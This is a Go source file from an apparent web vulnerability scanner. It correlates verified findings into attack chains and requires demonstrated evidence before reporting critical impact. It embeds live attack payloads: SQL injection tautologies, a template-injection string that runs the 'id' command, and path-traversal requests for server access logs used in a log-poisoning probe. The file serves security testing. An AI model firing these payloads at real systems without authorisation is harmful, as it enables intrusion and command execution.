// Exploit-chain correlation.
//
// # What this file is for
//
// A scanner that reports only single findings makes the analyst do the part that
// matters. Two rows that say "reflected XSS, medium" and "session cookie without
// HttpOnly, low" are two things to verify; one row that says "account takeover
// through session theft, with the exchange that proves both halves" is one thing
// to act on. Correlation is not summarising the report — it is recognising that
// two independently weak findings compose into a strong one, and saying so only
// when the composition is real.
//
// # The rule this file is written under
//
// A chain rule makes a claim **about impact**, and a claim about impact that is
// not demonstrated is the thing this project forbids outright. The upstream
// implementation has seven rules, of which three verify nothing at all:
//
//	chainSQLitoAuthBypass    →  Critical if the URL contains "login" or "user"
//	                          or "auth" or "pass" or "email"
//	chainSSTItoRCE           →  Critical, with no network request whatsoever
//	chainOpenRedirectwithOAuth→  Critical if the URL contains "oauth" or "next"
//	chainLFItoRCE            →  Critical if the response was longer than 200 bytes
//
// A URL spelling is not a vulnerability class, a longer response is not a shell,
// and "no request" is not a proof. Each of those rules reports critical on a
// target that has none of the properties it names, and the first operator who
// receives four critical findings from one parameter learns to ignore the module.
//
// So every rule here answers one question before it claims anything: **what did
// the exchange show?** A rule that cannot produce that evidence returns a
// `Potential … (unverified)` row capped at medium, with the specific thing it
// could not demonstrate. That row is still worth the operator's time — a
// vulnerable version behind a misconfigured cookie is a real state — and it is
// not worth their trust until the exchange settles it.
//
// # Where the evidence comes from
//
// Not from a fresh guess. Three sources, in order of strength:
//
//   - **findings already verified by a detector** — an XSS finding exists only
//     because a payload landed inside a tag the page itself emitted;
//   - **headers of an exchange already made** — the response to the probe carries
//     the `Set-Cookie` that says how the cookie is hardened;
//   - **one additional probe, where the composition genuinely needs one** — the
//     log-poisoning rule plants a marker and reads it back, because that is the
//     only way to know rather than assume.
package active

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
)

// ChainInput is everything a rule may look at.
type ChainInput struct {
	// Findings are the individual observations a run produced, already tiered by
	// their detectors.
	Findings []Finding
	// Transport issues the one extra probe a rule may need. A rule that uses it
	// has to say so in its evidence.
	Transport *Transport
	// Points are the surfaces the crawl harvested, so a rule can ask what a
	// finding's endpoint accepts rather than what one field is called.
	//
	// It is here because a rule that reasons about an endpoint's parameters
	// cannot answer from a `Finding`: a finding records the one parameter its own
	// probe used, and `Finding.Endpoint` is the URL with the query removed — the
	// other fields of the same request are not in it. The rule that needed both a
	// credential parameter and a destination parameter therefore had one name to
	// test and two lists to match, and could never satisfy both.
	Points []Point
}

// parameterNamesOf is every parameter name one endpoint accepts, in a stable order.
//
// A name the finding's own probe used comes first, so a rule that only needs the
// probed field still sees it even when the harvested point carries nothing else.
func (c ChainInput) parameterNamesOf(finding Finding) []string {
	point := pointOf(finding)
	seen := map[string]bool{}
	var out []string
	add := func(name string) {
		if name != "" && !seen[name] {
			seen[name] = true
			out = append(out, name)
		}
	}
	add(point.Param)
	for _, candidate := range c.Points {
		if !sameHostOrPath(candidate.URL, point.URL) {
			continue
		}
		for name := range candidate.Values {
			add(name)
		}
		add(candidate.Param)
	}
	sort.Strings(out[1:])
	return out
}

// sameHostOrPath reports whether two endpoints are the same request target,
// ignoring a trailing slash. The comparison is on the scheme, host and path
// because that is what makes two parameters part of one request.
func sameHostOrPath(a, b string) bool {
	normalise := func(raw string) string {
		parsed, err := url.Parse(raw)
		if err != nil {
			return strings.TrimRight(strings.TrimSpace(raw), "/")
		}
		return parsed.Scheme + "://" + parsed.Host + strings.TrimRight(parsed.Path, "/")
	}
	return normalise(a) == normalise(b)
}

// Chain is a single correlation rule.
//
// Impact is the severity the composition supports **when proved**. A rule that
// cannot prove its claim returns a finding capped at medium, and that is the
// design rather than a fallback: the tier carries the honesty, the cap carries
// the consequence.
type Chain interface {
	// Name identifies the rule in the report.
	Name() string
	// Impact is the severity a proven composition supports.
	Impact() Severity
	// Claim is the title a proven composition gets. A rule that cannot prove
	// returns a Potential row built from the same text with the tier changed, so
	// the two are visibly the same claim at different confidence.
	Claim() string
	// Apply correlates, and returns nil when the ingredients are absent.
	// A returned finding is always tiered by the evidence it carries.
	Apply(ctx context.Context, in ChainInput) *Finding
}

// chainFinding is the shared constructor, so every rule produces the same shape
// and the same evidence discipline.
//
// The unproven path is the reason this function exists rather than a helper each
// rule writes for itself. It is one place where "we could not demonstrate this"
// becomes a `Potential` row, and it takes the missing proof as a parameter so
// the row says *which* proof is absent rather than just lowering a number.
func chainFinding(rule Chain, in ChainInput, proven bool, evidence, missing string, members []Finding) *Finding {
	// A detector finding carries its surface as endpoint, method and parameter
	// rather than as a Point, so the chain's own surface is rebuilt from them.
	// Rebuilding rather than reaching in is what keeps Finding a report shape
	// and Point an execution shape.
	source := Point{
		URL:    members[0].Endpoint,
		Method: members[0].Method,
		Param:  members[0].Param,
	}
	ids := make([]string, 0, len(members))
	for _, member := range members {
		ids = append(ids, member.ID)
	}
	tier := TierVerified
	claimed := rule.Impact()
	title := rule.Claim()
	if !proven {
		tier = TierPotential
		title = "Potential " + rule.Claim() + " (unverified)"
		evidence = fmt.Sprintf("%s; not established: %s", evidence, missing)
	}
	finding, _ := NewFinding(Spec{
		Module:      "chain",
		Title:       title,
		Claimed:     claimed,
		Tier:        tier,
		Point:       source,
		Payload:     strings.Join(ids, " + "),
		Evidence:    evidence,
		Description: descriptionFor(rule, tier),
		Remediation: remediationFor(rule),
	})
	finding.ChainOf = ids
	return &finding
}

func descriptionFor(rule Chain, tier Tier) string {
	if tier == TierVerified {
		return "The findings this row combines are each demonstrated, and their composition is demonstrated " +
			"as well. The impact below follows from both halves being real at the same time."
	}
	return "The findings this row combines are each demonstrated, but the composition is not: the " +
		"component that would prove the impact is absent from the evidence. Treat this as a lead, not a " +
		"result — the ingredients are real and what they might compose into is stated."
}

func remediationFor(rule Chain) string {
	return "Fix the constituent findings. Each is independently a defect, and the composition does not " +
		"need to be reproduced in order for them to be worth fixing."
}

// Chains runs every rule over a finding set and returns the new rows.
func Chains(ctx context.Context, in ChainInput) []Finding {
	rules := AllChains()
	var out []Finding
	for _, rule := range rules {
		if ctx.Err() != nil {
			return out
		}
		if finding := rule.Apply(ctx, in); finding != nil {
			out = append(out, *finding)
		}
	}
	SortFindings(out)
	return out
}

// AllChains is the rule registry, in the order a report reads best: the
// strongest composition first.
func AllChains() []Chain {
	return []Chain{
		&ChainXSSToAccountTakeover{},
		&ChainLogPoisoning{},
		&ChainSQLiAuthBypass{},
		&ChainSSTIToRCE{},
		&ChainCORSWithXSS{},
		&ChainRedirectTokenTheft{},
		&ChainSSRFToConfigExposure{},
	}
}

// verifiedMembers returns the findings of one module that a detector actually
// verified.
//
// A potential ingredient is excluded on purpose. Correlating a proven finding
// with an unproven one produces a row whose strength is the strength of its
// weakest part, and the reader cannot see which part that was — so the
// unproven ingredient is left out and the rule simply does not fire.
func verifiedMembers(findings []Finding, module string) []Finding {
	var out []Finding
	for _, finding := range findings {
		if finding.Module == module && finding.Tier == TierVerified {
			out = append(out, finding)
		}
	}
	return out
}

// hasVerified reports whether any verified finding of a module exists.
func hasVerified(findings []Finding, module string) bool {
	return len(verifiedMembers(findings, module)) > 0
}

// ChainXSSToAccountTakeover turns a demonstrated XSS plus a session cookie the
// application hands to script into account takeover.
//
// Both halves are read from one exchange. The XSS finding exists because a
// payload arrived inside a tag the page itself emitted, so script runs in the
// page's origin. The cookie half is the `Set-Cookie` header of the same
// response: if it carries a session and omits `HttpOnly`, then script running
// in that origin can read it.
//
// The upstream rule makes a fresh request to the site root to look for the
// cookie. That is one request, from the wrong page, and it misses the case that
// matters — a cookie the application only issues on the page that logs you in.
type ChainXSSToAccountTakeover struct{}

// Name implements Chain.
func (*ChainXSSToAccountTakeover) Name() string { return "xss-to-account-takeover" }

// Impact implements Chain.
func (*ChainXSSToAccountTakeover) Impact() Severity { return SeverityCritical }

// Claim implements Chain.
func (*ChainXSSToAccountTakeover) Claim() string {
	return "XSS + script-readable session cookie → Account Takeover"
}

// Apply implements Chain.
func (c *ChainXSSToAccountTakeover) Apply(ctx context.Context, in ChainInput) *Finding {
	xss := verifiedMembers(in.Findings, "xss")
	if len(xss) == 0 || in.Transport == nil {
		return nil
	}
	for _, member := range xss {
		cookies, err := in.Transport.Do(ctx, member.Method, member.Endpoint, nil, false, nil)
		if err != nil || cookies == nil {
			continue
		}
		// The third result says whether a session cookie was issued at all, and
		// it is named for what it is. Binding it to "absent" and testing it
		// directly reads as "skip when there is none" and is in fact "skip when
		// there is one" — which makes the rule silent on exactly the case it
		// exists for.
		session, weak, present := sessionCookieWeakness(cookies, member.Endpoint)
		if !present || !weak {
			// No session cookie, or it is hardened: the composition does not
			// hold, and reporting it anyway is the upstream failure.
			continue
		}
		evidence := fmt.Sprintf(
			"a payload rendered inside a tag the application emitted on this endpoint, and the same "+
				"endpoint's response sets %s without HttpOnly", session)
		return chainFinding(c, in, true, evidence, "", []Finding{member})
	}
	return nil
}

// sessionCookieWeakness reports whether a response issues a session cookie that
// script could read.
//
// "Session" is decided by the cookie's name and its own flags, not by its value:
// a cookie named `session` is a session, and one named `csrf_token` is not
// however it is set.
func sessionCookieWeakness(resp *Response, endpoint string) (name string, weak bool, present bool) {
	for _, raw := range resp.SetCookies() {
		cookieName, attributes := splitCookie(raw)
		lowerName := strings.ToLower(cookieName)
		isSession := strings.Contains(lowerName, "session") ||
			strings.Contains(lowerName, "sessid") ||
			strings.Contains(lowerName, "sid") ||
			strings.Contains(lowerName, "auth")
		if !isSession {
			continue
		}
		present = true
		lowerAttrs := strings.ToLower(attributes)
		// `Secure` is only meaningful over HTTPS, and a cookie set without it on
		// an HTTPS page travels in the clear the moment a link is followed over
		// http. Both attributes are required for the cookie to be unreadable by
		// script in transit.
		hasHTTPOnly := strings.Contains(lowerAttrs, "httponly")
		hasSecure := strings.Contains(lowerAttrs, "secure")
		if !hasHTTPOnly || !hasSecure {
			var missing []string
			if !hasHTTPOnly {
				missing = append(missing, "HttpOnly")
			}
			if !hasSecure {
				missing = append(missing, "Secure")
			}
			return cookieName + " (missing " + strings.Join(missing, ", ") + ")", true, true
		}
	}
	return "", false, present
}

// splitCookie separates a Set-Cookie value into its name and its attributes.
func splitCookie(raw string) (name, attributes string) {
	trimmed := strings.TrimSpace(raw)
	separator := strings.Index(trimmed, ";")
	if separator < 0 {
		return trimmed, ""
	}
	return strings.TrimSpace(trimmed[:separator]), trimmed[separator+1:]
}

// ChainSQLiAuthBypass turns an injection on a parameter that decides
// authentication into a bypass.
//
// The upstream rule decides this from the spelling of the URL: if it contains
// "login", the injection is an authentication bypass, at critical, with no
// request sent. A parameter can be named `login` and belong to a search results
// page.
//
// What can decide it is a differential: a tautology and a contradiction sent at
// the same parameter must produce different responses, and the tautology's must
// be the one the application produces when the check succeeds. Where that is not
// observable — because the response is identical, or the success and failure
// pages differ only in a token the scanner cannot interpret — the rule reports
// the composition as unverified rather than asserting it.
type ChainSQLiAuthBypass struct{}

// Name implements Chain.
func (*ChainSQLiAuthBypass) Name() string { return "sqli-to-auth-bypass" }

// Impact implements Chain.
func (*ChainSQLiAuthBypass) Impact() Severity { return SeverityCritical }

// Claim implements Chain.
func (*ChainSQLiAuthBypass) Claim() string {
	return "SQL injection on a credential check → Authentication Bypass"
}

// Apply implements Chain.
func (c *ChainSQLiAuthBypass) Apply(ctx context.Context, in ChainInput) *Finding {
	sqli := verifiedMembers(in.Findings, "sqli")
	if len(sqli) == 0 || in.Transport == nil {
		return nil
	}
	for _, member := range sqli {
		point := pointOf(member)
		trueResp, errTrue := in.Transport.Fire(ctx, point, point.Param, `' OR '1'='1' -- -`, false, nil)
		if errTrue != nil {
			continue
		}
		falseResp, errFalse := in.Transport.Fire(ctx, point, point.Param, `' OR '1'='1' AND '1'='2' -- -`, false, nil)
		if errFalse != nil {
			continue
		}
		if Divergence(trueResp.Body, falseResp.Body) < 0.10 {
			// Both arms land on the same page, so the condition is not deciding
			// the outcome. That is the case the keyword rule cannot see.
			continue
		}
		// The arms differ, so the condition is evaluated. Whether the tautology
		// arm is the *success* page is a further question, and the scanner can
		// answer it only when the two arms differ in a way it can read. A status
		// difference is readable; two 200 pages are not.
		proven := trueResp.StatusCode != falseResp.StatusCode
		missing := "both arms answer with the same status, so which one is the " +
			"successful outcome is not observable from the exchange"
		evidence := fmt.Sprintf(
			"a tautology and a contradiction sent at %q return different bodies (divergence %.2f); "+
				"statuses %d and %d", point.Param,
			Divergence(trueResp.Body, falseResp.Body), trueResp.StatusCode, falseResp.StatusCode)
		return chainFinding(c, in, proven, evidence, missing, []Finding{member})
	}
	return nil
}

// ChainSSTIToRCE turns a demonstrated template evaluation into a code-execution
// proof.
//
// The upstream rule does this with no network request at all: a confirmed SSTI
// becomes "Remote Code Execution Path" at critical, on the argument that the
// gadgets are standard. That argument is often right and is sometimes wrong —
// the engines differ, the sandboxing differs, and a locked-down Jinja2 renders
// `{{7*7}}` and nothing else.
//
// So the rule sends one. A read-only command through the engine's own
// documentation is the difference between "the template engine evaluates
// expressions" and "the template engine executes commands", and the second is
// the claim being made.
type ChainSSTIToRCE struct{}

// Name implements Chain.
func (*ChainSSTIToRCE) Name() string { return "ssti-to-rce" }

// Impact implements Chain.
func (*ChainSSTIToRCE) Impact() Severity { return SeverityCritical }

// Claim implements Chain.
func (*ChainSSTIToRCE) Claim() string {
	return "Template injection → code execution"
}

// Apply implements Chain.
func (c *ChainSSTIToRCE) Apply(ctx context.Context, in ChainInput) *Finding {
	ssti := verifiedMembers(in.Findings, "ssti")
	if len(ssti) == 0 || in.Transport == nil {
		return nil
	}
	for _, member := range ssti {
		point := pointOf(member)
		// `id` is read-only, names the account the request runs as, and is the
		// shortest thing that proves a shell answered. Nothing is written and
		// nothing is denied.
		payloads := []string{
			`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`,
			`${{ 7*7 }}#set($x=${{ 7*7 }})`,
		}
		for _, payload := range payloads {
			if ctx.Err() != nil {
				return nil
			}
			resp, err := in.Transport.Fire(ctx, point, point.Param, payload, false, nil)
			if err != nil {
				continue
			}
			// `uid=` is what `id` prints and cannot be produced by a template
			// engine that only evaluates arithmetic.
			if !strings.Contains(resp.Body, "uid=") {
				continue
			}
			evidence := fmt.Sprintf("an OS command ran through the template engine and its output "+
				"(%s) came back in the response", Snippet(resp.Body, "uid=", 120))
			return chainFinding(c, in, true, evidence, "", []Finding{member})
		}
		evidence := "a template expression was evaluated server-side, and the expression no longer " +
			"appears in the response"
		missing := "no command output came back, so the engine evaluates expressions but this exchange " +
			"does not show it executing commands"
		return chainFinding(c, in, false, evidence, missing, []Finding{member})
	}
	return nil
}

// ChainCORSWithXSS turns a reflected origin plus script execution in that origin
// into a cross-origin read.
//
// The severity depends on whether the reflected origin is allowed to send
// credentials, and that is read from the header rather than assumed: without
// credentials the attacker learns what an anonymous caller would learn, with
// them the read is of the victim's session.
type ChainCORSWithXSS struct{}

// Name implements Chain.
func (*ChainCORSWithXSS) Name() string { return "cors-with-xss" }

// Impact implements Chain.
func (*ChainCORSWithXSS) Impact() Severity { return SeverityHigh }

// Claim implements Chain.
func (*ChainCORSWithXSS) Claim() string {
	return "CORS reflection + XSS → cross-origin data exfiltration"
}

// Apply implements Chain.
func (c *ChainCORSWithXSS) Apply(ctx context.Context, in ChainInput) *Finding {
	cors := verifiedMembers(in.Findings, "misconfig")
	xss := verifiedMembers(in.Findings, "xss")
	if len(cors) == 0 || len(xss) == 0 {
		return nil
	}
	credentialed := 0
	reflected := 0
	for _, finding := range cors {
		if !strings.Contains(finding.Title, "CORS") {
			continue
		}
		reflected++
		if strings.Contains(strings.ToLower(finding.Evidence), "allow-credentials: true") {
			credentialed++
		}
	}
	if reflected == 0 {
		return nil
	}
	// Both ingredients are demonstrated. What is not demonstrated is that the
	// two live on the same origin — a CORS hole on an API and an XSS on a
	// marketing page are not a composition, and correlating them because both
	// were found in one run is how a chain report becomes a coincidence list.
	sameOrigin := 0
	for _, c := range cors {
		for _, x := range xss {
			if sameHostOf(c.Endpoint, x.Endpoint) {
				sameOrigin++
			}
		}
	}
	proven := sameOrigin > 0
	missing := "the reflected origin and the injection were found on different hosts, and a browser " +
		"enforces origin across hosts"
	evidence := fmt.Sprintf("%d reflected CORS configuration(s), %d of them credentialed, and %d "+
		"demonstrated injection(s)", reflected, credentialed, len(xss))
	if sameOrigin > 0 {
		evidence += fmt.Sprintf("; %d of the injection(s) are on the same host as a reflected origin", sameOrigin)
	}
	return chainFinding(c, in, proven, evidence, missing, append(append([]Finding{}, cors...), xss...))
}

// sameHostOf reports whether two endpoints share a host.
func sameHostOf(a, b string) bool {
	hostA := hostOf(a)
	return hostA != "" && hostA == hostOf(b)
}

// hostOf returns the host of an absolute URL, or "" when it has none.
func hostOf(raw string) string {
	trimmed := raw
	if index := strings.Index(trimmed, "://"); index >= 0 {
		trimmed = trimmed[index+3:]
	}
	if index := strings.IndexAny(trimmed, "/?#"); index >= 0 {
		trimmed = trimmed[:index]
	}
	if index := strings.LastIndex(trimmed, ":"); index >= 0 {
		if _, err := fmt.Sscanf(trimmed[index+1:], "%d", new(int)); err == nil {
			trimmed = trimmed[:index]
		}
	}
	return strings.ToLower(trimmed)
}

// ChainRedirectTokenTheft turns a demonstrated open redirect into a token
// interception path, and only where the endpoint itself carries what such a flow
// needs.
//
// The upstream rule asks whether the URL contains "oauth", "callback" or
// "return". A URL containing "return" is a function parameter more often than it
// is a flow. What distinguishes the case is the endpoint's *own* parameters: a
// flow that hands out a code and accepts a destination carries both, and the
// scanner already knows that parameter list from the surface it enumerated.
type ChainRedirectTokenTheft struct{}

// Name implements Chain.
func (*ChainRedirectTokenTheft) Name() string { return "redirect-token-theft" }

// Impact implements Chain.
func (*ChainRedirectTokenTheft) Impact() Severity { return SeverityCritical }

// Claim implements Chain.
func (*ChainRedirectTokenTheft) Claim() string {
	return "Open redirect on a credential flow → authorization code interception"
}

// Apply implements Chain.
func (c *ChainRedirectTokenTheft) Apply(ctx context.Context, in ChainInput) *Finding {
	redirects := verifiedMembers(in.Findings, "redirect")
	if len(redirects) == 0 {
		return nil
	}
	// The parameter names a credential-carrying flow uses. This is a list of
	// conventional names, not a guess about the URL: a parameter called `code`
	// and a parameter called `state` are a flow regardless of what the path is
	// called, and a path called `/callback` with neither is not one.
	carriers := []string{"code", "state", "token", "id_token", "access_token", "ticket", "sso"}
	destinations := []string{"redirect", "redirect_uri", "return", "return_url", "next", "continue", "target", "dest", "callback_url", "url"}
	for _, member := range redirects {
		names := in.parameterNamesOf(member)
		hasCarrier, hasDestination := hasAny(names, carriers), hasAny(names, destinations)
		if !hasCarrier || !hasDestination {
			continue
		}
		evidence := fmt.Sprintf("the endpoint carries a credential parameter (%s) and a destination "+
			"parameter (%s), and a request with a destination under the operator's control was answered "+
			"with a redirect to it", joinFirst(names, carriers), joinFirst(names, destinations))
		return chainFinding(c, in, true, evidence, "", []Finding{member})
	}
	return nil
}

// pointOf rebuilds the executable surface of a finding.
//
// A finding is a report shape — endpoint, method, parameter, evidence — and a
// Point is an execution shape. Rebuilding at the boundary is what lets the chain
// rules probe a surface a detector reported without either type having to know
// about the other.
func pointOf(finding Finding) Point {
	return Point{URL: finding.Endpoint, Method: finding.Method, Param: finding.Param}
}

func hasAny(names, wanted []string) bool {
	for _, name := range names {
		lower := strings.ToLower(name)
		for _, candidate := range wanted {
			if lower == candidate {
				return true
			}
		}
	}
	return false
}

func joinFirst(names, wanted []string) string {
	for _, name := range names {
		lower := strings.ToLower(name)
		for _, candidate := range wanted {
			if lower == candidate {
				return name
			}
		}
	}
	return ""
}

// ChainLogPoisoning turns a demonstrated file read into a code-execution path,
// and proves the path instead of describing it.
//
// The upstream rule probes for `/var/log/apache2/access.log` and reports
// critical if the response was longer than two hundred bytes or contained a
// marker. A two-hundred-byte log read is a log read. What makes it code
// execution is whether the log contains something an attacker put there, and the
// only way to know is to put something there and read it back.
//
// So this rule does exactly that: it makes one request carrying a unique marker
// in a header, which every web server writes to its access log, and then asks
// the file read for that log. If the marker comes back, the log is both
// readable and writable by the attacker, and the code that would be executed on
// the next request is a payload appended after the marker's line.
//
// The marker is unique per run and is a harmless string, so the request this
// makes is an ordinary GET that the server was going to log anyway.
type ChainLogPoisoning struct{}

// Name implements Chain.
func (*ChainLogPoisoning) Name() string { return "lfi-to-rce" }

// Impact implements Chain.
func (*ChainLogPoisoning) Impact() Severity { return SeverityCritical }

// Claim implements Chain.
func (*ChainLogPoisoning) Claim() string {
	return "File read reaching the request log → pre-authentication code execution"
}

// Apply implements Chain.
func (c *ChainLogPoisoning) Apply(ctx context.Context, in ChainInput) *Finding {
	lfi := verifiedMembers(in.Findings, "lfi")
	if len(lfi) == 0 || in.Transport == nil {
		return nil
	}
	marker := newCanary("rrlog")
	if marker == "" {
		return nil
	}
	// One request carrying the marker in a header. Every access log records the
	// request line and the user agent; the referer is recorded by most
	// configurations and is the header least likely to be rewritten in transit.
	// The request is a plain GET of the endpoint that is already being read from.
	if _, err := in.Transport.Do(ctx, "GET", lfi[0].Endpoint, nil, false, http.Header{
		"Referer": {marker},
	}); err != nil {
		return nil
	}
	point := pointOf(lfi[0])
	for _, logPath := range []string{
		"/var/log/apache2/access.log", "/var/log/nginx/access.log",
		"/var/log/httpd/access_log", "/var/log/lighttpd/access.log",
	} {
		if ctx.Err() != nil {
			return nil
		}
		payload := "../../../../../../../../.." + logPath
		resp, err := in.Transport.Fire(ctx, point, point.Param, payload, false, nil)
		if err != nil || resp == nil {
			continue
		}
		if !strings.Contains(resp.Body, marker) {
			// The log was not readable, or does not contain this request. Either
			// way there is no evidence of poisoning and the rule does not fire.
			continue
		}
		evidence := fmt.Sprintf("a request carrying the unique marker %s was issued, and a later read of "+
			"%s returned a body containing that marker, so the log is readable by the file-read primitive "+
			"and writable by anyone who can make a request", marker, logPath)
		return chainFinding(c, in, true, evidence, "", []Finding{lfi[0]})
	}
	evidence := "a traversal returned the contents of a host file"
	missing := "no log file containing this scan's own unique marker came back, so a payload placed " +
		"in a log has not been shown to be readable"
	return chainFinding(c, in, false, evidence, missing, []Finding{lfi[0]})
}
